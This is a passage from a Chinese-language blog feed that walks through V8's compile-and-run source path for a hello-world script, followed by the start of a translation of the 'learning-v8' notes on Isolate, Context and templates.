class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里补充一句，v8几乎满篇都是<code>ToLocal</code>、<code>ToLocalCbecked</code>什么的，<code>ToLocal</code>和<code>OpenHandle</code>是v8用来转换内部类和外部类的，Checked表示不为空，如果为空会直接抛出异常。可以看么这个函数前后有一些检查，然后就是<code>CompileUnboundInternal</code>这个函数了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">MaybeLocal&lt;UnboundScript&gt; ScriptCompiler::CompileUnboundInternal(</span><br><span class="line">    Isolate* v8_isolate, Source* source, CompileOptions options,</span><br><span class="line">    NoCacheReason no_cache_reason) &#123;</span><br><span class="line">  <span class="keyword">auto</span> isolate = <span class="keyword">reinterpret_cast</span>&lt;i::Isolate*&gt;(v8_isolate);</span><br><span class="line">  TRACE_EVENT_CALL_STATS_SCOPED(isolate, <span class="string">"v8"</span>, <span class="string">"V8.ScriptCompiler"</span>);</span><br><span class="line">  ENTER_V8_NO_SCRIPT(isolate, v8_isolate-&gt;GetCurrentContext(), ScriptCompiler,</span><br><span class="line">                     CompileUnbound, MaybeLocal&lt;UnboundScript&gt;(),</span><br><span class="line">                     InternalEscapableScope);</span><br><span class="line"></span><br><span class="line">  i::ScriptData* script_data = <span class="literal">nullptr</span>;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  i::Handle&lt;i::String&gt; str = Utils::OpenHandle(*(source-&gt;source_string));</span><br><span class="line">  i::Handle&lt;i::SharedFunctionInfo&gt; result;</span><br><span class="line">  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span class="string">"v8.compile"</span>), <span class="string">"V8.CompileScript"</span>);</span><br><span class="line">  i::Compiler::ScriptDetails script_details = GetScriptDetails(</span><br><span class="line">      isolate, source-&gt;resource_name, source-&gt;resource_line_offset,</span><br><span class="line">      source-&gt;resource_column_offset, source-&gt;source_map_url,</span><br><span class="line">      source-&gt;host_defined_options);</span><br><span class="line">  i::MaybeHandle&lt;i::SharedFunctionInfo&gt; maybe_function_info =</span><br><span class="line">      i::Compiler::GetSharedFunctionInfoForScript(</span><br><span class="line">          isolate, str, script_details, source-&gt;resource_options, <span class="literal">nullptr</span>,</span><br><span class="line">          script_data, options, no_cache_reason, i::NOT_NATIVES_CODE);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> script_data;</span><br><span class="line">  has_pending_exception = !maybe_function_info.ToHandle(&amp;result);</span><br><span class="line">  RETURN_ON_FAILED_EXECUTION(UnboundScript);</span><br><span class="line">  RETURN_ESCAPED(ToApiHandle&lt;UnboundScript&gt;(result));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>忽略其它操作直接进入<code>GetSharedFunctionInfoForScript</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">MaybeHandle&lt;SharedFunctionInfo&gt; Compiler::GetSharedFunctionInfoForScript(</span><br><span class="line">    Isolate* isolate, Handle&lt;String&gt; source,</span><br><span class="line">    <span class="keyword">const</span> Compiler::ScriptDetails&amp; script_details,</span><br><span class="line">    ScriptOriginOptions origin_options, v8::Extension* extension,</span><br><span class="line">    ScriptData* cached_data, ScriptCompiler::CompileOptions compile_options,</span><br><span class="line">    ScriptCompiler::NoCacheReason no_cache_reason, NativesFlag natives) &#123;</span><br><span class="line">  <span class="function">ScriptCompileTimerScope <span class="title">compile_timer</span><span class="params">(isolate, no_cache_reason)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (compile_options == ScriptCompiler::kNoCompileOptions ||</span><br><span class="line">      compile_options == ScriptCompiler::kEagerCompile) &#123;</span><br><span class="line">    DCHECK_NULL(cached_data);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(compile_options == ScriptCompiler::kConsumeCodeCache);</span><br><span class="line">    DCHECK(cached_data);</span><br><span class="line">    DCHECK_NULL(extension);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> source_length = source-&gt;length();</span><br><span class="line">  isolate-&gt;counters()-&gt;total_load_size()-&gt;Increment(source_length);</span><br><span class="line">  isolate-&gt;counters()-&gt;total_compile_size()-&gt;Increment(source_length);</span><br><span class="line"></span><br><span class="line">  LanguageMode language_mode = construct_language_mode(FLAG_use_strict);</span><br><span class="line">  CompilationCache* compilation_cache = isolate-&gt;compilation_cache();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do a lookup in the compilation cache but not for extensions.</span></span><br><span class="line">  <span class="comment">// 找cache主要是在每个isolate里找看有没有compilation的cache，如果有，直接反序列化取出来用</span></span><br><span class="line">  <span class="comment">// 下面就不粘找cache的代码了，直接看编译过程</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (maybe_result.is_null()) &#123;</span><br><span class="line">    <span class="comment">// No cache entry found compile the script.</span></span><br><span class="line">    <span class="keyword">if</span> (FLAG_stress_background_compile &amp;&amp;</span><br><span class="line">        CanBackgroundCompile(script_details, origin_options, extension,</span><br><span class="line">                             compile_options, natives)) &#123;</span><br><span class="line">      <span class="comment">// If the --stress-background-compile flag is set, do the actual</span></span><br><span class="line">      <span class="comment">// compilation on a background thread, and wait for its result.</span></span><br><span class="line">      maybe_result = CompileScriptOnBothBackgroundAndMainThread(</span><br><span class="line">          source, script_details, origin_options, isolate, &amp;is_compiled_scope);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      UnoptimizedCompileFlags flags =</span><br><span class="line">          UnoptimizedCompileFlags::ForToplevelCompile(</span><br><span class="line">              isolate, natives == NOT_NATIVES_CODE, language_mode,</span><br><span class="line">              script_details.repl_mode);</span><br><span class="line"></span><br><span class="line">      flags.set_is_eager(compile_options == ScriptCompiler::kEagerCompile);</span><br><span class="line">      flags.set_is_module(origin_options.IsModule());</span><br><span class="line"></span><br><span class="line">      maybe_result = CompileScriptOnMainThread(</span><br><span class="line">          flags, source, script_details, origin_options, natives, extension,</span><br><span class="line">          isolate, &amp;is_compiled_scope);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add the result to the isolate cache.</span></span><br><span class="line">    Handle&lt;SharedFunctionInfo&gt; result;</span><br><span class="line">    <span class="keyword">if</span> (extension == <span class="literal">nullptr</span> &amp;&amp; maybe_result.ToHandle(&amp;result)) &#123;</span><br><span class="line">      DCHECK(is_compiled_scope.is_compiled());</span><br><span class="line">      compilation_cache-&gt;PutScript(source, isolate-&gt;native_context(),</span><br><span class="line">                                   language_mode, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maybe_result.is_null() &amp;&amp; natives != EXTENSION_CODE) &#123;</span><br><span class="line">      isolate-&gt;ReportPendingMessages();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> maybe_result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现主要函数是<code>CompileScriptOnMainThread</code>和<code>CompileScriptOnBothBackgroundAndMainThread</code>，随便进一个看下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MaybeHandle&lt;SharedFunctionInfo&gt; CompileScriptOnMainThread(</span><br><span class="line">    <span class="keyword">const</span> UnoptimizedCompileFlags flags, Handle&lt;String&gt; source,</span><br><span class="line">    <span class="keyword">const</span> Compiler::ScriptDetails&amp; script_details,</span><br><span class="line">    ScriptOriginOptions origin_options, NativesFlag natives,</span><br><span class="line">    v8::Extension* extension, Isolate* isolate,</span><br><span class="line">    IsCompiledScope* is_compiled_scope) &#123;</span><br><span class="line">  <span class="function">UnoptimizedCompileState <span class="title">compile_state</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="function">ParseInfo <span class="title">parse_info</span><span class="params">(isolate, flags, &amp;compile_state)</span></span>;</span><br><span class="line">  parse_info.set_extension(extension);</span><br><span class="line"></span><br><span class="line">  Handle&lt;Script&gt; script = NewScript(isolate, &amp;parse_info, source,</span><br><span class="line">                                    script_details, origin_options, natives);</span><br><span class="line">  DCHECK_IMPLIES(parse_info.flags().collect_type_profile(),</span><br><span class="line">                 script-&gt;IsUserJavaScript());</span><br><span class="line">  DCHECK_EQ(parse_info.flags().is_repl_mode(), script-&gt;is_repl_mode());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> CompileToplevel(&amp;parse_info, script, isolate, is_compiled_scope);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续向下分析，<code>CompileToplevel</code>-&gt;<code>parsing::ParseProgram</code>-&gt;<code>Parser::ParseProgram</code>-&gt;<code>Parser::DoParseProgram</code>，在DoParserProgram中看到终于进入主线剧情：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FunctionLiteral* Parser::DoParseProgram(Isolate* isolate, ParseInfo* info) &#123;</span><br><span class="line">  <span class="comment">// Note that this function can be called from the main thread or from a</span></span><br><span class="line">  <span class="comment">// background thread. We should not access anything Isolate / heap dependent</span></span><br><span class="line">  <span class="comment">// via ParseInfo, and also not pass it forward. If not on the main thread</span></span><br><span class="line">  <span class="comment">// isolate will be nullptr.</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里对编译描述类进行查询，判断待编译字符串是否是模块、包装函数，会进入不同的分支；</span></span><br><span class="line">    <span class="comment">// 由于测试代码只是两个字符串相加，所以进入最后的分支。</span></span><br><span class="line">    <span class="keyword">if</span> (flags().is_module()) &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (info-&gt;is_wrapped_as_function()) &#123;</span><br><span class="line">      DCHECK(parsing_on_main_thread_);</span><br><span class="line">      ParseWrapped(isolate, info, &amp;body, scope, zone());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags().is_repl_mode()) &#123;</span><br><span class="line">      ParseREPLProgram(info, &amp;body, scope);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Don't count the mode in the use counters--give the program a chance</span></span><br><span class="line">      <span class="comment">// to enable script-wide strict mode below.</span></span><br><span class="line">      <span class="keyword">this</span>-&gt;scope()-&gt;SetLanguageMode(info-&gt;language_mode());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 进入这个分支</span></span><br><span class="line">      ParseStatementList(&amp;body, Token::EOS);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入那个分支后的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Impl&gt;</span><br><span class="line"><span class="keyword">void</span> ParserBase&lt;Impl&gt;::ParseStatementList(StatementListT* body,</span><br><span class="line">                                          Token::Value end_token) &#123;</span><br><span class="line">  <span class="comment">// StatementList ::</span></span><br><span class="line">  <span class="comment">//   (StatementListItem)* &lt;end_token&gt;</span></span><br><span class="line">  DCHECK_NOT_NULL(body);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// v8对之前解析的第一个词法进行判断，来选择是否开启严格模式或者asm模式</span></span><br><span class="line">  <span class="keyword">while</span> (peek() == Token::STRING) &#123;</span><br><span class="line">    <span class="keyword">bool</span> use_strict = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">bool</span> use_asm = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    Scanner::Location token_loc = scanner()-&gt;peek_location();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (scanner()-&gt;NextLiteralExactlyEquals(<span class="string">"use strict"</span>)) &#123;</span><br><span class="line">      use_strict = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scanner()-&gt;NextLiteralExactlyEquals(<span class="string">"use asm"</span>)) &#123;</span><br><span class="line">      use_asm = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    StatementT stat = ParseStatementListItem();</span><br><span class="line">    <span class="keyword">if</span> (impl()-&gt;IsNull(stat)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    body-&gt;Add(stat);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!impl()-&gt;IsStringLiteral(stat)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (use_strict) &#123;</span><br><span class="line">      <span class="comment">// Directive "use strict" (ES5 14.1).</span></span><br><span class="line">      RaiseLanguageMode(LanguageMode::kStrict);</span><br><span class="line">      <span class="keyword">if</span> (!scope()-&gt;HasSimpleParameters()) &#123;</span><br><span class="line">        <span class="comment">// TC39 deemed "use strict" directives to be an error when occurring</span></span><br><span class="line">        <span class="comment">// in the body of a function with non-simple parameter list, on</span></span><br><span class="line">        <span class="comment">// 29/7/2015. https://goo.gl/ueA7Ln</span></span><br><span class="line">        impl()-&gt;ReportMessageAt(token_loc,</span><br><span class="line">                                MessageTemplate::kIllegalLanguageModeDirective,</span><br><span class="line">                                <span class="string">"use strict"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (use_asm) &#123;</span><br><span class="line">      <span class="comment">// Directive "use asm".</span></span><br><span class="line">      impl()-&gt;SetAsmModule();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Possibly an unknown directive.</span></span><br><span class="line">      <span class="comment">// Should not change mode, but will increment usage counters</span></span><br><span class="line">      <span class="comment">// as appropriate. Ditto usages below.</span></span><br><span class="line">      RaiseLanguageMode(LanguageMode::kSloppy);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 这里构建AST，加到body这个容器中</span></span><br><span class="line">  <span class="keyword">while</span> (peek() != end_token) &#123;</span><br><span class="line">    StatementT stat = ParseStatementListItem();</span><br><span class="line">    <span class="keyword">if</span> (impl()-&gt;IsNull(stat)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (stat-&gt;IsEmptyStatement()) <span class="keyword">continue</span>;</span><br><span class="line">    body-&gt;Add(stat);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此AST建完，再看怎么生成bytecode，<code>CompileToplevel</code>-&gt;<code>parsing::ParseProgram</code>-&gt;<code>Parser::ParseProgram</code>-&gt;<code>MaybeProcessSourceRanges()</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MaybeProcessSourceRanges</span><span class="params">(ParseInfo* parse_info, Expression* root,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">uintptr_t</span> stack_limit_)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (root != <span class="literal">nullptr</span> &amp;&amp; parse_info-&gt;source_range_map() != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="function">SourceRangeAstVisitor <span class="title">visitor</span><span class="params">(stack_limit_, root,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  parse_info-&gt;source_range_map())</span></span>;</span><br><span class="line">    visitor.Run();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>准备了一个AstVisitor来遍历AST，生成bytecode的。至于Run的内容，是一个巨长的宏，就不细看了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_AST_VISITOR_SUBCLASS_MEMBERS();</span><br></pre></td></tr></table></figure><p>至此Compile基本完成，再回去看<code>v8::Local&lt;v8::Value&gt; result = script-&gt;Run(context).ToLocalChecked();</code>。</p><h4 id="再看Script-Run"><a href="#再看Script-Run" class="headerlink" title="再看Script::Run()"></a>再看<code>Script::Run()</code></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MaybeLocal&lt;Value&gt; Script::Run(Local&lt;Context&gt; context) &#123;</span><br><span class="line">  <span class="keyword">auto</span> isolate = <span class="keyword">reinterpret_cast</span>&lt;i::Isolate*&gt;(context-&gt;GetIsolate());</span><br><span class="line">  TRACE_EVENT_CALL_STATS_SCOPED(isolate, <span class="string">"v8"</span>, <span class="string">"V8.Execute"</span>);</span><br><span class="line">  ENTER_V8(isolate, context, Script, Run, MaybeLocal&lt;Value&gt;(),</span><br><span class="line">           InternalEscapableScope);</span><br><span class="line">  i::<span class="function">HistogramTimerScope <span class="title">execute_timer</span><span class="params">(isolate-&gt;counters()-&gt;execute(), <span class="literal">true</span>)</span></span>;</span><br><span class="line">  i::<span class="function">AggregatingHistogramTimerScope <span class="title">timer</span><span class="params">(isolate-&gt;counters()-&gt;compile_lazy())</span></span>;</span><br><span class="line">  i::TimerEventScope&lt;i::TimerEventExecute&gt; timer_scope(isolate);</span><br><span class="line">  <span class="keyword">auto</span> fun = i::Handle&lt;i::JSFunction&gt;::cast(Utils::OpenHandle(<span class="keyword">this</span>));</span><br><span class="line"></span><br><span class="line">  i::Handle&lt;i::Object&gt; receiver = isolate-&gt;global_proxy();</span><br><span class="line">  Local&lt;Value&gt; result;</span><br><span class="line">  has_pending_exception = !ToLocal&lt;Value&gt;(</span><br><span class="line">      i::Execution::Call(isolate, fun, receiver, <span class="number">0</span>, <span class="literal">nullptr</span>), &amp;result);</span><br><span class="line"></span><br><span class="line">  RETURN_ON_FAILED_EXECUTION(Value);</span><br><span class="line">  RETURN_ESCAPED(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的代码，好像在learning-v8里看过，好，就此弃坑，因为下面的函数好长：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">V8_WARN_UNUSED_RESULT MaybeHandle&lt;Object&gt; Invoke(Isolate* isolate,</span><br><span class="line">                                                 <span class="keyword">const</span> InvokeParams&amp; params) &#123;</span><br></pre></td></tr></table></figure><p><code>params.target</code>是要调的函数。</p><h3 id="退出，释放资源"><a href="#退出，释放资源" class="headerlink" title="退出，释放资源"></a>退出，释放资源</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispose the isolate and tear down V8.</span></span><br><span class="line">  isolate-&gt;Dispose();</span><br><span class="line">  v8::V8::Dispose();</span><br><span class="line">  v8::V8::ShutdownPlatform();</span><br><span class="line">  <span class="keyword">delete</span> create_params.array_buffer_allocator;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把之前的资源啥的都释放了，一次简短的v8之旅到此结束。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>话说本来我已经准备好全力探索v8了，结果刚摆好姿势，Sakura师傅就说别看v8了，直接扔了吧，推荐逆一逆闭源小软件，写写kernel，日日Android什么的，所以源码还没细读，就写了半个hello world又要弃坑了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;人总是会变的，以前我想变成风去推动风车，现在我想等风起。——大蛇丸&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;我为什么要学习v8源码&quot;&gt;&lt;a href=&quot;#我为什么要学习v8源码&quot; class=&quot;headerlink&quot; title=&quot;我为
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/v8/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>learning v8 翻译</title>
    <link href="https://github.com/Cracke-S-J/2020/05/31/learning-v8-%E7%BF%BB%E8%AF%91/"/>
    <id>https://github.com/Cracke-S-J/2020/05/31/learning-v8-%E7%BF%BB%E8%AF%91/</id>
    <published>2020-05-31T14:03:35.000Z</published>
    <updated>2020-06-07T10:27:02.563Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/danbev/learning-v8">https://github.com/danbev/learning-v8</a>，这是原文，可以让我看嘤文的话脑子基本不在线，所以边翻译边学习。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>v8基本由堆内存管理和执行栈组成，Chrome里面有回调队列、事件loop和其它WebAPIs（DOM，ajax，setTimeout等）或者在Node里APIs是Node.js API。</p><p>执行栈是一个装着栈指针的栈，对于每个调用函数，该函数被入栈，返回的时候出栈，当它们全部返回以后，可以从返回点继续执行，单线程的时候，要一直等函数返回才能继续执行。</p><p>这样就引出了异步执行函数，什么是异步函数？</p><p>以调用setTimeout函数为例，setTimeout被推入栈然后继续执行，这是回调队列和事件loop起作用的地方，setTimeout可以将函数添加到回调队列，当调用栈为空的时候，事件loop将处理这个队列。</p><p>TODO: 添加mirco task queue</p><p>【ssj】: 这里这么啰嗦估计跟Android那一套差不多。</p><h2 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h2><p>Isolate是v8 runtime的独立副本，它有它自己的堆栈，两个不同的Isolate可以看做完全独立的沙箱实例。</p><h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>基本就是常规的那种上下文。</p><h2 id="ObjectTemplate"><a href="#ObjectTemplate" class="headerlink" title="ObjectTemplate"></a>ObjectTemplate</h2><p>这个允许创建对象，不需要使用构造函数，举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>这个类在include/v8.h中声明然后继承了模板：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT</span> <span class="title">ObjectTemplate</span> :</span> <span class="keyword">public</span> Template &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT</span> <span class="title">Template</span> :</span> <span class="keyword">public</span> Data &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V8_EXPORT</span> <span class="title">Data</span> &#123;</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  Data();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>模板没有任何 members/fields，它只有函数声明。</p><p>我们创建一个ObjectTemplate实例，并可以向其中添加使用些ObjectTemplate实例创建的所有实例为属性（外国人说话真麻烦），这是通过调用Set，Template的成员函数来完成的，可以自定义属性，Name是Symbols和Strings的父类，它们都可以用作属性的名字。</p><p>下面是src/api/api.cc中Set的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Template::Set&lt;v8::Local&lt;Name&gt; name, v8::Local&lt;Data&gt; value, v8::PropertyAttribute attribute) &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  i::ApiNatives::AddDataProperty(isolate, templ, Utils::OpenHandle(*name),</span><br><span class="line">                                 value_obj,</span><br><span class="line">                                 <span class="keyword">static_cast</span>&lt;i::PropertyAttributes&gt;(attribute));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里有个<a href="https://github.com/danbev/learning-v8/blob/master/test/objecttemplate_test.cc">例子</a>。</p><h2 id="FunctionTemplate"><a href="#FunctionTemplate" class="headerlink" title="FunctionTemplate"></a>FunctionTemplate</h2><p>这是创建函数的模板，<a href="https://github.com/danbev/learning-v8/blob/master/test/functiontemplate_test.cc">例子</a>。</p><p>一个函数模板的实例可以这样被创建：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 